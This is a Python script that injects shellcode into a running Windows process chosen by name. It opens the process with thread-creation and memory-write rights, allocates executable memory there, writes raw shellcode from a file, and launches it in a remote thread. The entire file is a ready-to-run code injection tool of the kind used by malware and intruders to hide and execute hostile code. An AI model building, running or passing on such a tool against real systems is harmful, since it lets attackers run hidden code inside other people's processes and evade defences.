import ctypes as c
import ctypes.wintypes as cw
from argparse import ArgumentParser
from os import fsencode

import process_helpers as ph


# The permissions required to create a thread and write to the enclosing process' memory.
PROCESS_CREATE_THREAD = 0x2
PROCESS_VM_OPERATION = 0x8
PROCESS_VM_WRITE = 0x20
PROCESS_VM_READ = 0x10
PROCESS_QUERY_INFORMATION = 0x400

REQUIRED_RIGHTS_TO_INJECT = PROCESS_CREATE_THREAD | PROCESS_VM_OPERATION | PROCESS_QUERY_INFORMATION \
                            | PROCESS_VM_WRITE | PROCESS_VM_READ

PAGE_EXECUTE_READWRITE = 0x40


MEM_COMMIT = 0x1000
MEM_RELEASE = 0x8000

START_RUNNING = 0x0


def open_process_for_injection(pid: int) -> cw.HANDLE:
    proc_handle = ph.open_process(REQUIRED_RIGHTS_TO_INJECT, False, pid)
    if proc_handle is None:
        raise RuntimeError(ph.formatted_last_error("open process"))
    else:
        return proc_handle


def write_shellcode_to_process(process_handle: cw.HANDLE, shellcode: bytes) -> cw.LPVOID:
    shellcode_length = len(shellcode)
    # Allocate memory to write the shellcode to.
    remote_memory_addr = ph.remote_virtual_alloc(process_handle, None, shellcode_length, MEM_COMMIT, PAGE_EXECUTE_READWRITE)
    if remote_memory_addr is None:
        raise RuntimeError(ph.formatted_last_error("allocate memory"))
    else:
        print("Remote memory address:", hex(remote_memory_addr))
        # TODO: Check for how much was written? Do we care?
        write_result = ph.remote_write_memory(process_handle, remote_memory_addr, shellcode, shellcode_length, None)
        if write_result:
            ph.flush_instruction_cache(process_handle, remote_memory_addr, shellcode_length)
            return remote_memory_addr
        else:
            raise RuntimeError(ph.formatted_last_error("write shellcode"))


def start_remote_thread(process_handle: cw.HANDLE, shellcode_address: cw.LPVOID) -> None:
    thread_id = cw.DWORD()
    thread_id_ptr = c.byref(thread_id)
    thread_handle = ph.remote_thread_create(process_handle,
                                            None,  # Default security
                                            0,  # Default stack size
                                            shellcode_address,
                                            None,  # No argument to pass
                                            START_RUNNING,
                                            thread_id_ptr)
    if thread_handle is None:
        raise RuntimeError(ph.formatted_last_error("start thread"))
    else:
        print("Remote thread created. Thread ID:", thread_id.value)


def inject_code(target_process_pid: int, shellcode: bytes) -> None:
    # Get a handle to the process so we can create a remote thread and write to it.
    proc_handle = open_process_for_injection(target_process_pid)
    try:
        shellcode_ptr = write_shellcode_to_process(proc_handle, shellcode)
        start_remote_thread(proc_handle, shellcode_ptr)
        # TODO: Currently leaking memory.
    finally:
        ph.close_handle(proc_handle)
        print("Closed Proc Handle")


def main():
    parser = ArgumentParser()
    parser.add_argument("-n", "--name",
                        help="Name of the process to inject into.")
    parser.add_argument("-s", "--shellcode",
                        help="The path to the shellcode to inject.")

    args = parser.parse_args()

    with open(args.shellcode, "rb") as f:
        shellcode = f.read()

    # A bit of an abuse of the function, but it reverses the decoding does to command-line arguments, since we need bytes.
    proc_name = fsencode(args.name)

    pids = ph.get_process_ids(proc_name)
    first_pid = next(pids, None)

    if first_pid is None:
        raise ValueError(f"Process {args.name} not found!")
    else:
        inject_code(first_pid, shellcode)


if __name__ == "__main__":
    main()